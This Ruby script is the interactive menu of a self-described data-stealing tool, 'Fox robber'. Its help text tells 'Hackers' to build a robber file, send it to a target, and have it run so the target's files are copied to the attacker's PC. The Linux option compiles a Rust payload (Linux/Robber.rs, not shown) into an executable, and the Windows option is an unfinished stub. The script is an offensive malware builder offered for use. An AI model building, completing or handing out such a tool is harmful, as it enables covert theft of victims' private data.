require 'colorize'

$error = 'This command is not true'

module All
  class Help
    def help
      system('clear')
      puts 'Explain:'.red
      puts "** Hi Hackers.
      Welcome to the Fox robber. The Fox robber can make some file to steal a lot of data.\n**********************************************************************************************************\n** How to use it?\n(1). First, you have to make a Fox robber file, Enter number 1 to make a Fox robber file; Then you have to see a lot of option to make your own Fox robber file.\n(2). Send the file for your target.\n(3). Run the file.\n(4). The END. you copied your target data and you can see your targets files in your PC.\nWrite \"exit\" to exit(in first page)\n".green
      puts 'Simple Help:'.red
      puts "** First enter 1 or type fox-robber to make robber file.\n** Select simple robber.\n** Now you have executable file in ".green + 'Out'.light_blue + " folder .\n\n[0]. Back".green
    end
  end
end
system('clear')
while true
  system('clear')
  puts "\tFOX ROBBER\n"
  puts "Tools:\n[0]. Back\n[1]. Fox robber\n[2]. Help".green
  job = 'nil'
  print "\n(#{job})>".yellow
  command = gets.chomp
  case command
  when '1', 'fox-robber'
    system('clear')
    puts "Enter target OS:\n[4]. Windows\n[5]. Linux\n[0]. Back".green # \n[6]. Mac\n[7]. Android\n[8]. IOS\n[0]. Back"
    job = 'fox-robber'
    while true
      job = 'fox-robber'
      print "\n(#{job})>".yellow
      command_fox_robber = gets.chomp
      if %w[4 windows].include?(command_fox_robber)
        while true
          if %w[0 back].include?(command_fox_robber)
            system('clear')
            break
          else
            case command_fox_robber
            when '4', 'windows'
              system('clear')
              puts "What do you want:\n[9]. Simple Robber\n[0]. Back".green
              job = 'fox-robber [windows]'
              print "\n(#{job})>".yellow
              command_windows = gets.chomp
              case command_windows
              when '9', 'simple-robber'
                puts 'Loading...'.blue

                ### Need More work ###

                puts 'File made by Fox Robber 🦊'.red
                puts '<Press enter>'.yellow
                gets.chomp
                break
              when '0', 'back'
                break
              end
            end
          end
        end
        break
      elsif %w[5 linux].include?(command_fox_robber)
        while true
          system('clear')
          if %w[0 back].include?(command_fox_robber)
            break
          else
            puts "What do you want:\n[9]. Simple Robber\n[0]. Back".green
            job = 'fox-robber [linux]'
            print "\n(#{job})>".yellow
            command_linux = gets.chomp
            case command_linux
            when '9', 'simple-robber'
              puts 'Loading...'.blue
              system('rustc Linux/Robber.rs --out-dir Out')
              system('chmod -r+x Out/Robber')
              puts 'File made by Fox Robber 🦊'.red
              puts '<Press enter>'.yellow
              gets.chomp
              break
            when '0', 'back'
              break
            end
          end
        end
        break
      elsif %w[0 back].include?(command_fox_robber)
        system('clear')
        break
      else
        puts $error.red
        system('sleep 1')
      end
    end
  when '2', 'help'
    helper = All::Help.new
    helper.help
    while true
      job = 'help'
      print "\n(#{job})>".yellow
      command_help = gets.chomp
      if %w[0 back].include?(command_help)
        system('clear')
        break
      else
        puts $error.red
        system('sleep 1')
      end
    end
  when '0', 'back'
    next
  when 'exit'
    system('clear')
    exit
  else
    puts $error.red
    system('sleep 1')
    print "\n(#{job} [linux])>".yellow
  end
end
